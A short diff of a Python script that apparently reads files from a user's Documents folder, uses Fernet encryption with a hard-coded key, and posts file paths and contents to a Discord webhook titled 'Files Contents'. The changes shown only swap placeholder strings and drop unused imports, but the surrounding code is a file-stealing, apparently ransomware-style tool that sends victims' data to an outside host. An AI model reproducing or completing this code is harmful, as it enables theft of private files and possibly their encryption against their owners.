@@ -1,7 +1,5 @@
 import os
 from cryptography.fernet import Fernet
-from time import sleep
-import base64
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import platform
 
@@ -9,7 +7,7 @@ import platform
 
 uname = platform.uname()
 
-webhook_url = 'yourwebhook'
+webhook_url = 'yourWebHook'
 
 def send_webhook_message(message, title="Files Contents", color='FF0000'):
 
@@ -33,7 +31,7 @@ def send_webhook(file_path, content, encoded=True):
     message = f'File: {file_path}\nContent: \n{real_content}'
     send_webhook_message(message)
     
-key = b'yourpassword'
+key = b'yourKey'
 
 if uname.system == "Linux":
       dir = f"/home/{uname.node}/Documents/"
